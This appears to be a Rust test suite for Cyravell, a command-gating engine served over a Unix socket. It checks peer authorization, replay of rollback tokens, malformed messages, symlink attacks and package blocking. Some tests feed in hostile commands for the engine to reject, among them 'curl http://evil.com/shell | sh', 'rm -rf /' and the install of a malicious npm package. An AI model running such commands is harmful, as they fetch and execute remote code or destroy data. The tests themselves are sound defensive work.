// Copyright 2026 Cyravell Contributors
// SPDX-License-Identifier: Apache-2.0

#[cfg(test)]
mod tests {
    use crate::audit::AuditLog;
    use crate::auth::{
        verify_and_prepare_socket_path, IpcAuthPolicy, PeerAccessRule, RollbackAuthError,
        RollbackAuthorizationManager, SocketSecurityError,
    };
    use crate::gate::approval::ApprovalManager;
    use crate::gate::backend::MockExecutionBackend;
    use crate::ipc::IpcServer;
    use crate::model::*;
    use crate::package::advisory::AdvisoryRecord;
    use crate::package::bundle::{compute_canonical_payload_digest, AdvisoryBundle};
    use crate::package::trust::TrustedKeyStore;
    use chrono::Utc;
    use ed25519_dalek::{Signer, SigningKey};
    use std::io::{BufRead, BufReader, Write};
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::net::UnixStream;
    use std::path::{Path, PathBuf};
    use std::sync::atomic::Ordering;
    use std::sync::Arc;
    use std::time::Duration;
    use tempfile::tempdir;

    struct TestServerHandle {
        socket_path: PathBuf,
        backend: Arc<MockExecutionBackend>,
        audit: Arc<AuditLog>,
        server: Arc<IpcServer>,
        _dir: tempfile::TempDir,
        thread: Option<std::thread::JoinHandle<()>>,
    }

    impl Drop for TestServerHandle {
        fn drop(&mut self) {
            self.server.shutdown();
            let _ = UnixStream::connect(&self.socket_path); // wake up accept loop
            if let Some(t) = self.thread.take() {
                let _ = t.join();
            }
            if self.socket_path.exists() {
                let _ = std::fs::remove_file(&self.socket_path);
            }
        }
    }

    fn setup_server(auth_policy: IpcAuthPolicy) -> TestServerHandle {
        setup_server_with_keys(auth_policy, None)
    }

    fn setup_server_with_keys(
        auth_policy: IpcAuthPolicy,
        trusted_keys: Option<Arc<TrustedKeyStore>>,
    ) -> TestServerHandle {
        let dir = tempdir().unwrap();
        let socket_path = dir.path().join("test_engine.sock");
        let data_dir = dir.path().join("data");
        std::fs::create_dir_all(&data_dir).unwrap();

        let backend = Arc::new(MockExecutionBackend::new());
        let approval_manager = Arc::new(ApprovalManager::default());

        let server = Arc::new(
            IpcServer::with_components(
                &socket_path,
                &data_dir,
                None,
                dir.path().to_path_buf(),
                approval_manager,
                backend.clone(),
                auth_policy,
                trusted_keys,
            )
            .unwrap(),
        );

        let s_clone = server.clone();
        let thread = std::thread::spawn(move || {
            let _ = s_clone.run();
        });

        // Wait for server to bind and be ready
        let mut ready = false;
        for _ in 0..50 {
            std::thread::sleep(Duration::from_millis(20));
            if socket_path.exists() && UnixStream::connect(&socket_path).is_ok() {
                ready = true;
                break;
            }
        }
        assert!(ready, "Server failed to start and accept connections");

        let audit = server.state().audit.clone();

        TestServerHandle {
            socket_path,
            backend,
            audit,
            server,
            _dir: dir,
            thread: Some(thread),
        }
    }

    fn send_request_raw(socket_path: &Path, raw: &str) -> Result<String, std::io::Error> {
        let mut stream = UnixStream::connect(socket_path)?;
        stream.set_read_timeout(Some(Duration::from_secs(3)))?;
        stream.set_write_timeout(Some(Duration::from_secs(3)))?;

        stream.write_all(raw.as_bytes())?;
        if !raw.ends_with('\n') {
            stream.write_all(b"\n")?;
        }
        stream.flush()?;

        let mut reader = BufReader::new(stream);
        let mut resp = String::new();
        reader.read_line(&mut resp)?;
        Ok(resp)
    }

    fn send_rpc(
        socket_path: &Path,
        method: &str,
        params: Option<serde_json::Value>,
    ) -> Result<JsonRpcResponse, std::io::Error> {
        let req = JsonRpcRequest {
            jsonrpc: "2.0".to_string(),
            id: serde_json::json!(1),
            method: method.to_string(),
            params,
        };
        let serialized = serde_json::to_string(&req).unwrap();
        let raw_resp = send_request_raw(socket_path, &serialized)?;
        let parsed: JsonRpcResponse = serde_json::from_str(&raw_resp)
            .unwrap_or_else(|e| panic!("Failed to parse response: {} from: '{}'", e, raw_resp));
        Ok(parsed)
    }

    fn make_test_key(seed_byte: u8, key_id: &str, publisher: &str) -> (SigningKey, TrustedKey) {
        let seed = [seed_byte; 32];
        let signing_key = SigningKey::from_bytes(&seed);
        let pubkey_bytes = signing_key.verifying_key().to_bytes();
        let pubkey_hex = hex::encode(pubkey_bytes);
        let trusted_key = TrustedKey {
            key_id: key_id.to_string(),
            publisher: publisher.to_string(),
            public_key_hex: pubkey_hex,
            created_at: Utc::now(),
            expires_at: None,
            is_active: true,
        };
        (signing_key, trusted_key)
    }

    fn sample_advisory(id: &str, pkg: &str, is_malicious: bool) -> AdvisoryRecord {
        AdvisoryRecord {
            id: id.to_string(),
            ecosystem: PackageEcosystem::Npm,
            package_name: pkg.to_string(),
            severity: if is_malicious {
                Severity::Critical
            } else {
                Severity::High
            },
            is_malicious,
            affected_range: ">= 1.0.0, < 2.0.0".to_string(),
            fixed_version: if is_malicious {
                None
            } else {
                Some("2.0.0".to_string())
            },
            title: format!("Advisory for {}", pkg),
            details: format!("Details for {}", pkg),
            cve_id: Some("CVE-2026-0001".to_string()),
            provenance: Some("Cyravell Test Suite".to_string()),
            is_synthetic: false,
        }
    }

    fn build_signed_bundle(
        signing_key: &SigningKey,
        key_id: &str,
        publisher: &str,
        database_version: &str,
        advisories: Vec<AdvisoryRecord>,
    ) -> AdvisoryBundle {
        let payload_digest = compute_canonical_payload_digest(&advisories);
        let mut bundle = AdvisoryBundle {
            bundle_format_version: "1.0".to_string(),
            database_version: database_version.to_string(),
            created_at: Utc::now(),
            publisher: publisher.to_string(),
            key_id: key_id.to_string(),
            min_cyravell_version: Some("0.1.0".to_string()),
            supported_ecosystems: vec![
                PackageEcosystem::Npm,
                PackageEcosystem::Pip,
                PackageEcosystem::Cargo,
            ],
            payload_digest,
            signature: String::new(),
            advisories,
        };
        let signing_bytes = bundle.canonical_signing_bytes();
        let sig = signing_key.sign(&signing_bytes);
        bundle.signature = hex::encode(sig.to_bytes());
        bundle
    }

    // -------------------------------------------------------------------------
    // 1. Unauthorized local peer connection attempt (UID mismatch)
    // -------------------------------------------------------------------------
    #[test]
    fn test_01_unauthorized_local_peer_connection_attempt() {
        // Configure policy that only allows UID 99999 (current UID does not match)
        let policy = IpcAuthPolicy {
            rule: PeerAccessRule::ExplicitUids([99999].into_iter().collect()),
            owner_uid: 99999,
            allow_read_only_for_other_users: false,
        };
        let handle = setup_server(policy);

        let raw = send_request_raw(
            &handle.socket_path,
            "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"engine.handshake\"}",
        )
        .unwrap();

        let resp: JsonRpcResponse = serde_json::from_str(&raw).unwrap();
        assert!(resp.result.is_none());
        let err = resp.error.expect("Expected JSON-RPC error for denied peer");
        assert_eq!(err.code, -32003);
        assert!(err.message.contains("Access denied: peer UID"));

        // Verify audit log captured IPC_ACCESS_DENIED
        let records = handle.audit.read_all_records().unwrap();
        assert!(records
            .iter()
            .any(|r| r.action_recorded == "IPC_ACCESS_DENIED"));
    }

    // -------------------------------------------------------------------------
    // 2. Authorized peer permitted operations
    // -------------------------------------------------------------------------
    #[test]
    fn test_02_authorized_peer_permitted_operations() {
        let current_uid = unsafe { libc::geteuid() };
        let policy = IpcAuthPolicy {
            rule: PeerAccessRule::SameUserOnly,
            owner_uid: current_uid,
            allow_read_only_for_other_users: false,
        };
        let handle = setup_server(policy);

        // Handshake
        let resp = send_rpc(&handle.socket_path, "engine.handshake", None).unwrap();
        assert!(resp.error.is_none());
        assert_eq!(resp.result.unwrap()["status"], "ready");

        // Health check
        let resp2 = send_rpc(&handle.socket_path, "engine.get_health", None).unwrap();
        assert!(resp2.error.is_none());
        assert_eq!(resp2.result.unwrap()["status"], "healthy");

        // Command analysis
        let resp3 = send_rpc(
            &handle.socket_path,
            "command.analyze",
            Some(serde_json::json!({ "command": "echo safe" })),
        )
        .unwrap();
        assert!(resp3.error.is_none());
    }

    // -------------------------------------------------------------------------
    // 3. Read-only peer attempted privileged operation
    // -------------------------------------------------------------------------
    #[test]
    fn test_03_readonly_peer_attempted_privileged_operation() {
        let current_uid = unsafe { libc::geteuid() };
        // Current user is non-owner but allowed for ReadOnly
        let policy = IpcAuthPolicy {
            rule: PeerAccessRule::ExplicitUids([current_uid].into_iter().collect()),
            owner_uid: 99999, // Different owner
            allow_read_only_for_other_users: true,
        };
        let handle = setup_server(policy);

        // ReadOnly operation succeeds
        let read_resp = send_rpc(&handle.socket_path, "engine.get_health", None).unwrap();
        assert!(read_resp.error.is_none());

        // Privileged operation (approval.decide) fails with -32003
        let priv_resp = send_rpc(
            &handle.socket_path,
            "approval.decide",
            Some(serde_json::json!({
                "request_id": "req-1",
                "decision": "Approved"
            })),
        )
        .unwrap();
        assert!(priv_resp.result.is_none());
        let err = priv_resp.error.expect("Expected privilege required error");
        assert_eq!(err.code, -32003);
        assert!(err.message.contains("requires privileged authorization"));

        // Privileged operation (gate.dispatch_authorized) fails with -32003
        let disp_resp = send_rpc(
            &handle.socket_path,
            "gate.dispatch_authorized",
            Some(serde_json::json!({
                "request_id": "req-1",
                "session_id": "sess-1",
                "command": "echo attack",
                "authorization_token": "token-xyz"
            })),
        )
        .unwrap();
        assert_eq!(disp_resp.error.unwrap().code, -32003);

        // Zero backend execution occurred
        assert!(handle.backend.commands_executed().is_empty());

        // Verify audit log captured IPC_OPERATION_DENIED
        let records = handle.audit.read_all_records().unwrap();
        assert!(records
            .iter()
            .any(|r| r.action_recorded == "IPC_OPERATION_DENIED"));
    }

    // -------------------------------------------------------------------------
    // 4. Rollback confirmation phrase without token rejected
    // -------------------------------------------------------------------------
    #[test]
    fn test_04_rollback_confirmation_phrase_without_token_rejected() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // Create a dummy bundle file
        let bundle_file = handle._dir.path().join("dummy_bundle.json");
        std::fs::write(&bundle_file, "{}").unwrap();

        let resp = send_rpc(
            &handle.socket_path,
            "package.import_advisory_bundle",
            Some(serde_json::json!({
                "bundle_path": bundle_file.to_str().unwrap(),
                "allow_rollback": true,
                "rollback_confirmation_token": "CONFIRM_ADVISORY_ROLLBACK",
                "rollback_authorization_token": null
            })),
        )
        .unwrap();

        assert!(resp.result.is_none());
        let err = resp.error.unwrap();
        assert_eq!(err.code, -32008);
        assert!(err.message.contains("missing rollback_authorization_token"));

        let records = handle.audit.read_all_records().unwrap();
        assert!(records
            .iter()
            .any(|r| r.action_recorded == "PACKAGE_ADVISORY_ROLLBACK_ATTEMPTED"));
    }

    // -------------------------------------------------------------------------
    // 5. Client-spoofed claimed identity in body ignored
    // -------------------------------------------------------------------------
    #[test]
    fn test_05_client_spoofed_claimed_identity_in_body_ignored() {
        let current_uid = unsafe { libc::geteuid() };
        // Server requires owner UID 99999; current peer is NOT owner
        let policy = IpcAuthPolicy {
            rule: PeerAccessRule::ExplicitUids([current_uid].into_iter().collect()),
            owner_uid: 99999,
            allow_read_only_for_other_users: true,
        };
        let handle = setup_server(policy);

        // Client attempts to spoof root or owner identity in request body
        let spoofed_body = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "approval.decide",
            "params": {
                "request_id": "req-1",
                "decision": "Approved",
                "claimed_uid": 99999,
                "claimed_user": "root",
                "source_user": "root"
            }
        });

        let raw = send_request_raw(
            &handle.socket_path,
            &serde_json::to_string(&spoofed_body).unwrap(),
        )
        .unwrap();

        let resp: JsonRpcResponse = serde_json::from_str(&raw).unwrap();
        assert!(resp.result.is_none());
        let err = resp.error.unwrap();
        // Kernel peer credentials authoritative: operation denied
        assert_eq!(err.code, -32003);
        assert!(err.message.contains("lacks required privilege"));
    }

    // -------------------------------------------------------------------------
    // 6. Rollback authorization token replay or payload digest mismatch rejected
    // -------------------------------------------------------------------------
    #[test]
    fn test_06_rollback_authorization_token_replay_and_digest_mismatch_rejected() {
        // Create trusted test key
        let (sk, tk) = make_test_key(42, "test-key-rb", "Cyravell Test Authority");
        let mut key_store = TrustedKeyStore::new();
        key_store.add_key(tk);
        let handle =
            setup_server_with_keys(IpcAuthPolicy::same_user_only(), Some(Arc::new(key_store)));

        // Bundle A (v3.5.0)
        let adv_a = vec![sample_advisory("ADV-A", "pkg-a", false)];
        let bundle_a = build_signed_bundle(
            &sk,
            "test-key-rb",
            "Cyravell Test Authority",
            "3.5.0",
            adv_a,
        );
        let path_a = handle._dir.path().join("bundle_a.json");
        std::fs::write(&path_a, serde_json::to_string(&bundle_a).unwrap()).unwrap();

        // Bundle B (v3.5.0, different content / digest)
        let adv_b = vec![sample_advisory("ADV-B", "pkg-b", false)];
        let bundle_b = build_signed_bundle(
            &sk,
            "test-key-rb",
            "Cyravell Test Authority",
            "3.5.0",
            adv_b,
        );
        let path_b = handle._dir.path().join("bundle_b.json");
        std::fs::write(&path_b, serde_json::to_string(&bundle_b).unwrap()).unwrap();

        // 1. Request rollback authorization for Bundle A
        let req_auth = send_rpc(
            &handle.socket_path,
            "package.request_rollback_authorization",
            Some(serde_json::json!({
                "bundle_path": path_a.to_str().unwrap(),
                "target_version": "3.5.0",
                "reason": "Emergency operational patch application",
                "confirmation_phrase": "CONFIRM_ADVISORY_ROLLBACK"
            })),
        )
        .unwrap();

        assert!(req_auth.error.is_none());
        let res_val = req_auth.result.unwrap();
        let auth_res: PackageRequestRollbackAuthorizationResult =
            serde_json::from_value(res_val).unwrap();
        let token = auth_res.rollback_authorization_token;
        assert!(token.starts_with("cyr-rollback-"));

        // 2. Present Token A with Bundle B -> PayloadDigestMismatch rejected
        let mismatch_resp = send_rpc(
            &handle.socket_path,
            "package.import_advisory_bundle",
            Some(serde_json::json!({
                "bundle_path": path_b.to_str().unwrap(),
                "allow_rollback": true,
                "rollback_confirmation_token": "CONFIRM_ADVISORY_ROLLBACK",
                "rollback_authorization_token": token.clone()
            })),
        )
        .unwrap();
        assert_eq!(mismatch_resp.error.unwrap().code, -32008);

        // 3. Import Bundle A with Token A -> Success
        let ok_resp = send_rpc(
            &handle.socket_path,
            "package.import_advisory_bundle",
            Some(serde_json::json!({
                "bundle_path": path_a.to_str().unwrap(),
                "allow_rollback": true,
                "rollback_confirmation_token": "CONFIRM_ADVISORY_ROLLBACK",
                "rollback_authorization_token": token.clone()
            })),
        )
        .unwrap();
        assert!(ok_resp.error.is_none());

        // 4. Replay exact same Token A with Bundle A -> Replay rejected (AlreadyConsumed)
        let replay_resp = send_rpc(
            &handle.socket_path,
            "package.import_advisory_bundle",
            Some(serde_json::json!({
                "bundle_path": path_a.to_str().unwrap(),
                "allow_rollback": true,
                "rollback_confirmation_token": "CONFIRM_ADVISORY_ROLLBACK",
                "rollback_authorization_token": token
            })),
        )
        .unwrap();
        assert!(replay_resp.result.is_none());
        let err = replay_resp.error.unwrap();
        assert_eq!(err.code, -32008);
        assert!(err.message.contains("already been consumed"));
    }

    // -------------------------------------------------------------------------
    // 7. Unauthorized client approval decision or command dispatch rejected
    // -------------------------------------------------------------------------
    #[test]
    fn test_07_unauthorized_client_approval_decision_or_command_dispatch_rejected() {
        let current_uid = unsafe { libc::geteuid() };
        // Read-only client cannot decide or dispatch
        let policy = IpcAuthPolicy {
            rule: PeerAccessRule::ExplicitUids([current_uid].into_iter().collect()),
            owner_uid: 99999,
            allow_read_only_for_other_users: true,
        };
        let handle = setup_server(policy);

        let decide_resp = send_rpc(
            &handle.socket_path,
            "approval.decide",
            Some(serde_json::json!({
                "request_id": "req-unauth",
                "decision": "Approved"
            })),
        )
        .unwrap();
        assert_eq!(decide_resp.error.unwrap().code, -32003);

        let dispatch_resp = send_rpc(
            &handle.socket_path,
            "gate.dispatch_authorized",
            Some(serde_json::json!({
                "request_id": "req-unauth",
                "session_id": "sess-unauth",
                "command": "rm -rf /tmp/data",
                "authorization_token": "token-forged"
            })),
        )
        .unwrap();
        assert_eq!(dispatch_resp.error.unwrap().code, -32003);

        assert!(handle.backend.commands_executed().is_empty());
    }

    // -------------------------------------------------------------------------
    // 8. Oversized, malformed, truncated, duplicate-key IPC messages rejected
    // -------------------------------------------------------------------------
    #[test]
    fn test_08_oversized_malformed_truncated_duplicate_key_ipc_messages_rejected() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // 1. Oversized message (> 1 MiB)
        let large_cmd = "a".repeat(1024 * 1024 + 10);
        let oversized_raw = format!(
            "{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"command.analyze\",\"params\":{{\"command\":\"{}\"}}}}",
            large_cmd
        );
        let resp_over = send_request_raw(&handle.socket_path, &oversized_raw).unwrap();
        let parsed_over: JsonRpcResponse = serde_json::from_str(&resp_over).unwrap();
        assert_eq!(parsed_over.error.unwrap().code, -32600);

        // 2. Truncated / malformed JSON
        let malformed_raw = "{\"jsonrpc\":\"2.0\",\"method\":";
        let resp_mal = send_request_raw(&handle.socket_path, malformed_raw).unwrap();
        let parsed_mal: JsonRpcResponse = serde_json::from_str(&resp_mal).unwrap();
        assert_eq!(parsed_mal.error.unwrap().code, -32700);

        // 3. Duplicate key in JSON frame
        let duplicate_key_raw = "{\"jsonrpc\":\"2.0\",\"method\":\"engine.handshake\",\"method\":\"engine.shutdown\",\"id\":1}";
        let resp_dup = send_request_raw(&handle.socket_path, duplicate_key_raw).unwrap();
        let parsed_dup: JsonRpcResponse = serde_json::from_str(&resp_dup).unwrap();
        let dup_err = parsed_dup.error.unwrap();
        assert_eq!(dup_err.code, -32700);
        assert!(dup_err.message.contains("duplicate key"));

        // 4. Invalid envelope: bad jsonrpc version
        let bad_env_raw = "{\"jsonrpc\":\"1.0\",\"method\":\"engine.handshake\",\"id\":1}";
        let resp_bad = send_request_raw(&handle.socket_path, bad_env_raw).unwrap();
        let parsed_bad: JsonRpcResponse = serde_json::from_str(&resp_bad).unwrap();
        assert_eq!(parsed_bad.error.unwrap().code, -32600);

        // 5. Invalid envelope: empty method
        let empty_method_raw = "{\"jsonrpc\":\"2.0\",\"method\":\"  \",\"id\":1}";
        let resp_empty = send_request_raw(&handle.socket_path, empty_method_raw).unwrap();
        let parsed_empty: JsonRpcResponse = serde_json::from_str(&resp_empty).unwrap();
        assert_eq!(parsed_empty.error.unwrap().code, -32600);
    }

    // -------------------------------------------------------------------------
    // 9. Socket path and parent-directory symlink attacks rejected
    // -------------------------------------------------------------------------
    #[test]
    fn test_09_socket_path_and_parent_directory_symlink_attacks_rejected() {
        let dir = tempdir().unwrap();

        // 1. Symlink parent directory
        let real_parent = dir.path().join("real_parent");
        std::fs::create_dir_all(&real_parent).unwrap();
        let symlink_parent = dir.path().join("symlink_parent");
        std::os::unix::fs::symlink(&real_parent, &symlink_parent).unwrap();
        let socket_in_symlink_parent = symlink_parent.join("engine.sock");

        let res1 = verify_and_prepare_socket_path(&socket_in_symlink_parent);
        assert!(matches!(
            res1,
            Err(SocketSecurityError::SymlinkForbidden(_))
        ));

        // 2. Symlink socket path
        let target_file = dir.path().join("arbitrary_target");
        std::fs::write(&target_file, "target content").unwrap();
        let symlink_socket = dir.path().join("symlink_socket.sock");
        std::os::unix::fs::symlink(&target_file, &symlink_socket).unwrap();

        let res2 = verify_and_prepare_socket_path(&symlink_socket);
        assert!(matches!(
            res2,
            Err(SocketSecurityError::SymlinkForbidden(_))
        ));

        // Verify target file was NOT unlinked or modified
        assert!(target_file.exists());
        assert_eq!(
            std::fs::read_to_string(&target_file).unwrap(),
            "target content"
        );
    }

    // -------------------------------------------------------------------------
    // 10. Stale socket handling safety
    // -------------------------------------------------------------------------
    #[test]
    fn test_10_stale_socket_handling() {
        let dir = tempdir().unwrap();
        let sock_path = dir.path().join("stale.sock");

        // Case A: Path is a regular file, NOT a socket -> Rejection
        std::fs::write(&sock_path, "regular file").unwrap();
        let res_regular = verify_and_prepare_socket_path(&sock_path);
        assert!(matches!(
            res_regular,
            Err(SocketSecurityError::StaleSocketNotASocket(_))
        ));
        std::fs::remove_file(&sock_path).unwrap();

        // Case B: Inactive dead socket -> Safely cleaned up and prepared
        {
            let _listener = std::os::unix::net::UnixListener::bind(&sock_path).unwrap();
            // Drop listener so socket becomes dead
        }
        assert!(sock_path.exists());
        let res_dead = verify_and_prepare_socket_path(&sock_path);
        assert!(res_dead.is_ok());
        assert!(!sock_path.exists()); // Dead socket safely removed

        // Case C: Active socket -> Rejection with AddrInUse
        let active_listener = std::os::unix::net::UnixListener::bind(&sock_path).unwrap();
        let res_active = verify_and_prepare_socket_path(&sock_path);
        assert!(res_active.is_err());
        drop(active_listener);
    }

    // -------------------------------------------------------------------------
    // 11. IPC disconnect during sensitive operations handled cleanly
    // -------------------------------------------------------------------------
    #[test]
    fn test_11_ipc_disconnect_during_sensitive_operations() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // Connect, send partial request, and abruptly disconnect
        {
            let mut stream = UnixStream::connect(&handle.socket_path).unwrap();
            stream.write_all(b"{\"jsonrpc\":\"2.0\",\"id\":1").unwrap();
            // Abrupt drop
        }

        std::thread::sleep(Duration::from_millis(50));

        // Engine continues functioning normally
        let healthy_resp = send_rpc(&handle.socket_path, "engine.get_health", None).unwrap();
        assert!(healthy_resp.error.is_none());
        assert_eq!(healthy_resp.result.unwrap()["status"], "healthy");
    }

    // -------------------------------------------------------------------------
    // 12. Concurrent authorization and approval-token consumption
    // -------------------------------------------------------------------------
    #[test]
    fn test_12_concurrent_token_consumption() {
        let manager = Arc::new(RollbackAuthorizationManager::new());
        let token = manager.issue_token(
            1000,
            "2.5.0".to_string(),
            "fake_digest_1234".to_string(),
            "Security downgrade mitigation".to_string(),
            60,
        );

        let success_count = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let consumed_count = Arc::new(std::sync::atomic::AtomicUsize::new(0));

        let mut handles = Vec::new();
        for _ in 0..10 {
            let m = manager.clone();
            let tok = token.clone();
            let succ = success_count.clone();
            let cons = consumed_count.clone();
            handles.push(std::thread::spawn(move || {
                match m.consume_token(&tok, 1000, "2.5.0", "fake_digest_1234") {
                    Ok(_) => {
                        succ.fetch_add(1, Ordering::SeqCst);
                    }
                    Err(RollbackAuthError::AlreadyConsumed) => {
                        cons.fetch_add(1, Ordering::SeqCst);
                    }
                    Err(e) => panic!("Unexpected error: {:?}", e),
                }
            }));
        }

        for h in handles {
            h.join().unwrap();
        }

        // Exactly one consumer succeeded, exactly nine received AlreadyConsumed
        assert_eq!(success_count.load(Ordering::SeqCst), 1);
        assert_eq!(consumed_count.load(Ordering::SeqCst), 9);
    }

    // -------------------------------------------------------------------------
    // 13. Insecure file permissions rejected on security state files
    // -------------------------------------------------------------------------
    #[test]
    fn test_13_insecure_file_permissions_rejected_on_security_state_files() {
        let dir = tempdir().unwrap();

        // 1. World-writable parent directory rejected by AuditLog
        let ww_parent = dir.path().join("world_writable_dir");
        std::fs::create_dir_all(&ww_parent).unwrap();
        std::fs::set_permissions(&ww_parent, std::fs::Permissions::from_mode(0o777)).unwrap();
        let audit_in_ww = ww_parent.join("audit.log");

        let audit_res = AuditLog::open(&audit_in_ww);
        assert!(matches!(
            audit_res,
            Err(crate::audit::AuditError::InsecurePermissions(_))
        ));

        // 2. World-writable socket parent directory rejected
        let socket_in_ww = ww_parent.join("test.sock");
        let sock_res = verify_and_prepare_socket_path(&socket_in_ww);
        assert!(matches!(
            sock_res,
            Err(SocketSecurityError::InsecureParentPermissions(_))
        ));

        // 3. Symlink parent directory rejected by AuditLog
        let real_dir = dir.path().join("real_dir");
        std::fs::create_dir_all(&real_dir).unwrap();
        let sym_dir = dir.path().join("sym_dir");
        std::os::unix::fs::symlink(&real_dir, &sym_dir).unwrap();
        let audit_in_sym = sym_dir.join("audit.log");

        let audit_sym_res = AuditLog::open(&audit_in_sym);
        assert!(matches!(
            audit_sym_res,
            Err(crate::audit::AuditError::SymlinkForbidden(_))
        ));
    }

    // -------------------------------------------------------------------------
    // 14. Audit accuracy for authorized and denied requests (no secret tokens leaked)
    // -------------------------------------------------------------------------
    #[test]
    fn test_14_audit_accuracy_for_authorized_and_denied_requests() {
        let (sk, tk) = make_test_key(99, "test-key-audit", "Cyravell Test Authority");
        let mut key_store = TrustedKeyStore::new();
        key_store.add_key(tk);
        let handle =
            setup_server_with_keys(IpcAuthPolicy::same_user_only(), Some(Arc::new(key_store)));

        let adv = vec![sample_advisory("AUDIT-ADV", "audit-pkg", false)];
        let bundle = build_signed_bundle(
            &sk,
            "test-key-audit",
            "Cyravell Test Authority",
            "3.0.0",
            adv,
        );
        let bundle_path = handle._dir.path().join("audit_bundle.json");
        std::fs::write(&bundle_path, serde_json::to_string(&bundle).unwrap()).unwrap();

        // Issue token
        let auth_resp = send_rpc(
            &handle.socket_path,
            "package.request_rollback_authorization",
            Some(serde_json::json!({
                "bundle_path": bundle_path.to_str().unwrap(),
                "target_version": "3.0.0",
                "reason": "Administrative rollback verification audit check",
                "confirmation_phrase": "CONFIRM_ADVISORY_ROLLBACK"
            })),
        )
        .unwrap();

        let auth_res: PackageRequestRollbackAuthorizationResult =
            serde_json::from_value(auth_resp.result.unwrap()).unwrap();
        let secret_token = auth_res.rollback_authorization_token;

        // Consume token
        let _ = send_rpc(
            &handle.socket_path,
            "package.import_advisory_bundle",
            Some(serde_json::json!({
                "bundle_path": bundle_path.to_str().unwrap(),
                "allow_rollback": true,
                "rollback_confirmation_token": "CONFIRM_ADVISORY_ROLLBACK",
                "rollback_authorization_token": secret_token.clone()
            })),
        )
        .unwrap();

        // Read all audit records
        let records = handle.audit.read_all_records().unwrap();
        let audit_file_content =
            std::fs::read_to_string(handle._dir.path().join("data").join("audit.log")).unwrap();

        // 1. Audit log must record the rollback actions
        assert!(records
            .iter()
            .any(|r| r.action_recorded == "PACKAGE_ADVISORY_ROLLBACK_REQUESTED"));
        assert!(records
            .iter()
            .any(|r| r.action_recorded == "PACKAGE_ADVISORY_ROLLBACK_AUTHORIZED"));

        // 2. Secret token string must NEVER be leaked in the audit records
        assert!(
            !audit_file_content.contains(&secret_token),
            "Secret rollback authorization token was leaked into audit log!"
        );
    }

    // -------------------------------------------------------------------------
    // 15. Package hard blocks and tombstones remain strictly effective
    // -------------------------------------------------------------------------
    #[test]
    fn test_15_package_hard_blocks_and_tombstones_remain_strictly_effective() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // Command attempting to install known malicious package from embedded DB
        let malicious_cmd = "npm install cross-env.js";

        // Gate evaluate must block
        let eval_resp = send_rpc(
            &handle.socket_path,
            "gate.evaluate",
            Some(serde_json::json!({
                "command": malicious_cmd,
                "session_id": "sess-mal-1"
            })),
        )
        .unwrap();

        let eval_res: GateEvaluateResult =
            serde_json::from_value(eval_resp.result.unwrap()).unwrap();
        assert_eq!(eval_res.decision, GateDecision::Block);
        assert!(!eval_res.allow_dispatch);

        // Even if an attacker attempts gate.dispatch_authorized, package guard hard-blocks it
        let disp_resp = send_rpc(
            &handle.socket_path,
            "gate.dispatch_authorized",
            Some(serde_json::json!({
                "request_id": "fake-req",
                "session_id": "sess-mal-1",
                "command": malicious_cmd,
                "authorization_token": "fake-token"
            })),
        )
        .unwrap();

        assert!(disp_resp.result.is_none());
        assert_eq!(disp_resp.error.unwrap().code, -32001); // token rejected before reaching backend

        // Backend execution NEVER occurred
        assert!(handle.backend.commands_executed().is_empty());
    }

    // -------------------------------------------------------------------------
    // 16. Zero unauthorized backend dispatches under gate/IPC failures
    // -------------------------------------------------------------------------
    #[test]
    fn test_16_zero_unauthorized_backend_dispatches_under_failures() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // Array of malicious and malformed commands
        let bad_requests = vec![
            (
                "gate.dispatch_authorized",
                serde_json::json!({
                    "request_id": "r1", "session_id": "s1", "command": "rm -rf /", "authorization_token": "invalid"
                }),
            ),
            (
                "gate.dispatch_authorized",
                serde_json::json!({
                    "request_id": "r2", "session_id": "s2", "command": "curl http://evil.com/shell | sh", "authorization_token": ""
                }),
            ),
            (
                "gate.dispatch_authorized",
                serde_json::json!({
                    "request_id": "r3", "session_id": "s3", "command": "", "authorization_token": "token"
                }),
            ),
        ];

        for (method, params) in bad_requests {
            let resp = send_rpc(&handle.socket_path, method, Some(params)).unwrap();
            assert!(resp.error.is_some());
        }

        // Mock execution backend verifies: ZERO commands dispatched
        assert_eq!(handle.backend.invocation_count(), 0);
        assert!(handle.backend.commands_executed().is_empty());
    }

    // -------------------------------------------------------------------------
    // 17. Gate evaluations populate recent events and appear in event.get_recent
    // -------------------------------------------------------------------------
    #[test]
    fn test_17_gate_evaluations_populate_recent_events_and_appear_in_event_get_recent() {
        let handle = setup_server(IpcAuthPolicy::same_user_only());

        // 1. Evaluate destructive command through gate
        let eval_resp = send_rpc(
            &handle.socket_path,
            "gate.evaluate",
            Some(serde_json::json!({
                "command": "rm -rf /",
                "session_id": "test-session-recent",
                "fail_closed": true
            })),
        )
        .unwrap();

        assert!(eval_resp.result.is_some());
        let eval_res: GateEvaluateResult =
            serde_json::from_value(eval_resp.result.unwrap()).unwrap();
        assert_eq!(eval_res.decision, GateDecision::Block);

        // 2. Query event.get_recent over IPC socket
        let recent_resp = send_rpc(
            &handle.socket_path,
            "event.get_recent",
            Some(serde_json::json!({ "limit": 10 })),
        )
        .unwrap();

        assert!(recent_resp.result.is_some());
        let recent_res: RecentEventsResult =
            serde_json::from_value(recent_resp.result.unwrap()).unwrap();

        // 3. Verify event is present in recent events feed
        assert!(!recent_res.events.is_empty());
        let latest = &recent_res.events[0];
        assert_eq!(latest.assessment.severity, Severity::Critical);
        assert_eq!(latest.assessment.rule_id, "RULE-TERM-001");
        assert_eq!(
            latest.event.execution_status,
            ExecutionStatus::BlockedConfirmed
        );
        assert_eq!(latest.event.source_adapter, "controlled_execution_gate");
    }
}
